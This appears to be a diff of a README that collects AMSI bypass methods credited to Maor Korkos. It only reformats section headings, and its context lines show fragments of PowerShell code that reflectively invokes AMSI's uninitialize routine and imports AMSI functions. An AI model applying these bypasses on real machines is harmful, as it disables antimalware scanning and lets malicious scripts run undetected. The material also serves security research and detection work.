@@ -14,8 +14,8 @@ AMSI Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materia
 
 ## Script 
 
-1st Method by Maor Korkos
-
+# 1st Method by Maor Korkos
+---
 
 ```powershell
 Add-Type $APIs
@@ -31,7 +31,9 @@ $Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq U
 $Uninitialize.Invoke($object,$null)
 ```
 
-2nd Method by Maor Korkos
+# 2nd Method by Maor Korkos
+---
+
 ```powershell
 [DllImport("amsi")]
 public static extern int AmsiInitialize(string appName, out IntPtr context);
